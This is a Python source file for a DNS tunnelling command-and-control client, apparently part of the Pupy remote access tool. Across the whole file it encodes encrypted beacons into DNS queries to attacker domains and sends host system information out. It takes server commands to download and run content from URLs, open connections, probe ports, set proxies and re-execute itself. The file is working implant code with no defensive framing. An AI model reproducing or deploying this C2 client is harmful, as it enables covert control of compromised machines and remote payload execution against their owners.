# -*- coding: utf-8 -*-

__all__ = (
    'DnsCommandsClient',
)

import struct
import socket
import base64
import hashlib
import os
import sys
import zlib
import logging
import time
import uuid

from threading import Thread, Lock

import ascii85

try:
    import dnslib
except ImportError:
    logging.info('dnslib not available')
    dnslib = None

from Crypto.Random import get_random_bytes

from ecpv import ECPV
from picocmd import (
    Poll, Ack,
    SystemStatus,
    Sleep, CheckConnect,
    Reexec, Exit, Disconnect,
    Policy, Kex, SystemInfo,
    SetProxy, Connect, DownloadExec,
    PasteLink, CustomEvent,
    OnlineStatusRequest, PupyState,
    Error, ParcelInvalidCrc,
    ParcelInvalidPayload,
    Parcel,
    from_bytes, to_bytes
)

CLIENT_VERSION = 2

try:
    from network.lib import tinyhttp
except ImportError:
    tinyhttp = None

class ProxyInfo(object):
    __slots__ = (
        'scheme', 'ip', 'port', 'user', 'password'
    )

    def __init__(self, scheme, ip, port, user, password):
        scheme = scheme.upper()
        if scheme == 'SOCKS':
            scheme = 'SOCKS5'

        self.scheme = scheme
        self.ip = str(ip)
        self.port = port
        self.user = user
        self.password = password

    def as_tuple(self):
        return self.scheme, self.ip+(
            ':'+str(self.port) if self.port else ''
        ), self.user, self.password

    def __str__(self):
        if self.user and self.password:
            auth = '{}:{}@'.format(self.user, self.password)
        else:
            auth = ''

        return '{}://{}{}:{}'.format(
            self.scheme.lower(), auth, self.ip, self.port)

class DnsCommandsClient(Thread):
    def __init__(self, domain, key, ns=None, qtype='A', ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
        try:
            import pupy
            self.pupy = pupy
            self.pupy.broadcast_event = self._broadcast_event
            self.cid = pupy.cid
        except:
            self.pupy = None
            self.cid = 31337

        self.iid = os.getpid() % 65535

        if ns and dnslib:
            if not type(ns) in (list, tuple):
                ns = ns.split(':')
                if len(ns) == 1:
                    ns = (ns[0], 53)
                elif len(ns) == 2:
                    ns = ns[0], int(ns[1])
                else:
                    raise ValueError('Invalid NS address: {}'.format(ns))

            self.ns = ns
            self.ns_proto = ns_proto
            self.ns_socket = None
            self.ns_timeout = ns_timeout
            self.ns_socket_lock = Lock()
            self.qtype = qtype
            self.resolve = self._dnslib_resolve
        else:
            if ns:
                logging.error('dnslib not available, use system resolver')

            self.ns = None
            self.ns_socket = None
            self.qtype = None
            self.ns_timeout = None
            self.resolve = self._native_resolve

        self.node = uuid.getnode()
        self.nonce = from_bytes(get_random_bytes(4))
        self.domains = domain.split(',')
        self.domain_id = 0
        self.domain = self.domains[self.domain_id]
        self.translation = dict(zip(
            ''.join([
                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
                '=',
            ]),
            ''.join([
                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
                '-',
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
            ])))

        self.encoder = ECPV(public_key=key, curve='brainpoolP224r1')
        self.spi = None
        self.kex = None
        self.poll = 60
        self.active = True
        self.failed = 0
        self.proxy = None
        self._request_lock = Lock()

        Thread.__init__(self)

    def next(self):
        self.domain_id = (self.domain_id + 1) % len(self.domains)
        self.domain = self.domains[self.domain_id]
        self.failed = 0

    def event(self, command):
        logging.debug('Event: %s', command)
        self._request(command)

    def _broadcast_event(self, eventid):
        logging.debug('EventId: %08x', eventid)
        self.event(CustomEvent(eventid))

    def _native_resolve(self, hostname):
        _, _, addresses = socket.gethostbyname_ex(hostname)
        return addresses

    def _dnslib_resolve(self, hostname):
        q = dnslib.DNSRecord.question(hostname, self.qtype)
        r = None

        try:
            if self.ns_socket:
                with self.ns_socket_lock:
                    self.ns_socket.send(q.pack())
                    r = self.ns_socket.recv(65535)
            else:
                s = socket.socket(socket.AF_INET, self.ns_proto)
                try:
                    s.connect(self.ns)
                    s.settimeout(self.ns_timeout)
                    s.send(q.pack())
                    r = s.recv(65535)
                finally:
                    with self.ns_socket_lock:
                        if self.ns_proto == socket.SOCK_DGRAM and not self.ns_socket:
                            self.ns_socket = s
                        else:
                            s.close()

        except socket.error, e:
            logging.info('NS Request exception: %s (ns=%s)', e, self.ns)
            self.ns_socket = None

        if not r:
            return []

        parsed = dnslib.DNSRecord.parse(r)
        if parsed.header.rcode != dnslib.RCODE.NOERROR:
            return []

        result = []

        for record in parsed.rr:
            if not dnslib.QTYPE[record.rclass] == self.qtype:
                continue

            result.append(str(record.rdata))

        return result

    def _a_page_decoder(self, addresses, nonce, symmetric=None):
        if symmetric is None:
            symmetric = self.encoder.kex_completed

        resp = len(addresses)*[None]
        for address in addresses:
            raw = 0
            for part in [int(x) << (3-i)*8 for i,x in enumerate(address.split('.'))]:
                raw |= part

            idx = (raw & 0x3E000000) >> 25

            bits = (raw & 0x01FFFFFE) >> 1
            resp[idx] = struct.pack('>I', bits)[1:]

        data = b''.join(resp)
        length, = struct.unpack_from('B', data)
        payload = data[1:1+length]

        return self.encoder.decode(payload, nonce, symmetric)

    def _q_page_encoder(self, data):
        data_append = ''
        ldata = len(data)

        if ldata > 35:
            # 35 -- limit, 4 - nonce, 1 - version, 4 - CID, 2 - IID, 6 - NODE
            if CLIENT_VERSION > 1 and (ldata - 35 + 4 + 1 + 4 + 2 + 6 < 35):
                data, data_append = data[:35], data[35:]
            else:
                raise ValueError('Too big page size ({})'.format(ldata))

        nonce = self.nonce
        node_block = ''

        if CLIENT_VERSION > 1:
            node_block = data_append + struct.pack(
                '>BIH', CLIENT_VERSION, self.cid, self.iid)

            node_block += to_bytes(self.node, 6)

        payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
        payload_len = len(payload)

        if node_block:
            len_node_block = payload_len - (ldata - len(data_append))
            split_offset = payload_len - len_node_block
            payload, node_block = payload[:split_offset], payload[split_offset:]

        encoded = '.'.join([
            ''.join([
                self.translation[x] for x in base64.b32encode(part)
            ]) for part in [
                struct.pack('>I', self.spi) if self.spi else None,
                struct.pack('>I', nonce) + node_block,
                payload
            ] if part is not None
        ]) + '.' + self.domain

        self.nonce += payload_len
        return encoded, nonce

    def _request(self, *commands):
        with self._request_lock:
            return self._request_unsafe(commands)

    def _request_unsafe(self, commands):
        parcel = Parcel(*commands)

        gen_csum = None
        check_csum = None

        if CLIENT_VERSION == 2:
            gen_csum = self.encoder.gen_csum
            check_csum = self.encoder.check_csum

        page, nonce = self._q_page_encoder(
            parcel.pack(self.nonce, gen_csum))

        try:
            addresses = self.resolve(page)
            if len(addresses) < 2:
                logging.warning('DNSCNC: short answer: %s', addresses)
                return []

        except socket.error as e:
            logging.error('DNSCNC: Communication error: %s', e)
            self.next()
            return []

        response = None

        for attempt in xrange(2):
            try:
                payload = self._a_page_decoder(addresses, nonce)
                if not payload:
                    logging.error('DNSCNC: No data: %s -> %s', addresses, payload)
                    self.spi = None
                    self.encoder.kex_reset()
                    self.on_session_lost()
                    continue

                response = Parcel.unpack(payload, nonce, check_csum)

                if attempt > 0:
                    logging.info('DNSCNC: Recovered (%s) with PSK/PK', attempt)

                break

            except ParcelInvalidCrc:
                logging.error('CRC FAILED / Attempt %d [%s]', attempt, addresses)

                self.spi = None
                self.encoder.kex_reset()
                self.on_session_lost()

            except ParcelInvalidPayload, e:
                logging.error(
                    'CRC FAILED / Invalid payload (%s) / %s/%s',
                        e, self.failed, 5)

        if response:
            return list(response.commands)

        self.failed += 1

        if self.failed > 5:
            self.next()

        return []

    def on_pastelink(self, url, action, encoder):
        if not tinyhttp:
            logging.error('TinyHTTP is not available')
            return

        http = tinyhttp.HTTP(proxy=self.proxy, follow_redirects=True)
        content, code = http.get(url, code=True)
        if code == 200:
            try:
                content = ascii85.ascii85DecodeDG(content)
                content = self.encoder.unpack(content)
                if not content:
                    logging.error('PasteLink: unpack failed')
                    return

                content = zlib.decompress(content)
                chash, content = content[:20], content[20:]
                h = hashlib.sha1()
                h.update(content)
                if h.digest() == chash:
                    self.on_pastelink_content(url, action, content)
                else:
                    logging.error('PasteLink: Wrong hash after extraction: %s != %s',
                        h.digest(), chash)
            except Exception as e:
                logging.exception(e)

    def on_downloadexec(self, url, action, use_proxy):
        if not tinyhttp:
            logging.error('TinyHTTP is not available')
            return

        try:
            http = tinyhttp.HTTP(
                proxy=self.proxy if use_proxy else False,
                follow_redirects=True
            )

            content, code = http.get(url, code=True)
            if code == 200:
                self.on_downloadexec_content(url, action, content)

        except Exception as e:
            logging.exception(e)

    def on_pastelink_content(self, url, action, content):
        pass

    def on_downloadexec_content(self, url, action, content):
        pass

    def on_connect(self, ip, port, transport, proxy):
        pass

    def on_checkconnect(self, host, port_start, port_end):
        pass

    def on_checkonline(self):
        pass

    def on_exit(self):
        self.active = False

    def on_disconnect(self):
        pass

    def on_error(self, error, message=None):
        pass

    def on_session_established(self):
        pass

    def on_session_lost(self):
        pass

    def on_set_proxy(self, scheme, ip, port, user, password):
        if not scheme or scheme.lower() == 'none':
            self.proxy = False
        elif scheme.lower() == 'any':
            self.proxy = True
        else:
            self.proxy = ProxyInfo(scheme, ip, port, user, password)

    def process(self):
        commands = []

        if self.spi:
            commands = self._request(
                PupyState(bool(self.pupy.connection), self.pupy.manager.dirty),
                SystemStatus())
        else:
            commands = self._request(Poll())

        need_ack = len([
            x for x in commands if not type(x) in (
                Poll, Kex, Ack
            )
        ])

        if need_ack:
            logging.debug('NEED TO ACK: %s', need_ack)
            ack_response = self._request(Ack(need_ack))
            if not (len(ack_response) == 1 and isinstance(ack_response[0], Ack)):
                logging.error('ACK <-> ACK failed: received: %s', ack_response)

        for command in commands:
            logging.debug('command: %s', command)

            if isinstance(command, Policy):
                self.poll = command.poll

                if command.kex and not self.spi:
                    request = self.encoder.generate_kex_request()
                    kex = Kex(request)
                    response = self._request(kex)
                    if not len(response) == 1 or not isinstance(response[0], Kex):
                        logging.error('KEX sequence failed. Got %s instead of Kex',
                            response)
                        return

                    self.encoder.process_kex_response(response[0].parcel)
                    self.spi = kex.spi
                    self.on_session_established()

            elif isinstance(command, Poll):
                response = self._request(SystemInfo())

                if len(response) > 0 and not isinstance(response[0], Ack):
                    logging.debug('dnscnc:Submit SystemInfo: response=%s', response)
                    for cmd in response:
                        commands.append(cmd)

                response = self._request(SystemStatus())
                if len(response) > 0 and not isinstance(response[0], Ack):
                    logging.debug('dnscnc:Submit SystemStatus: response=%s', response)
                    for cmd in response:
                        commands.append(cmd)

            elif isinstance(command, PasteLink):
                self.on_pastelink(command.url, command.action, self.encoder)
            elif isinstance(command, DownloadExec):
                self.on_downloadexec(command.url, command.action, command.proxy)
            elif isinstance(command, SetProxy):
                self.on_set_proxy(
                    command.scheme, command.ip, command.port,
                    command.user, command.password
                )
            elif isinstance(command, Connect):
                self.on_connect(
                    str(command.ip),
                    int(command.port),
                    command.transport,
                    self.proxy
                )
            elif isinstance(command, Error):
                self.on_error(command.error, command.message)
            elif isinstance(command, Disconnect):
                self.on_disconnect()
            elif isinstance(command, Sleep):
                time.sleep(command.timeout)
            elif isinstance(command, CheckConnect):
                self.on_checkconnect(command.host, command.port_start, port_end=command.port_end)
            elif isinstance(command, OnlineStatusRequest):
                self.on_checkonline()
            elif isinstance(command, Reexec):
                try:
                    executable = os.readlink('/proc/self/exe')
                    args = open('/proc/self/cmdline').read().split('\x00')
                except:
                    executable = sys.executable
                    args = sys.argv

                os.execv(executable, args)
            elif isinstance(command, Exit):
                self.active = False
                self.on_exit()

    def run(self):
        while True:
            try:
                self.process()
            except Exception as e:
                logging.exception(e)

            if self.active:
                logging.debug('sleep %s', self.poll)
                time.sleep(self.poll)
            else:
                break
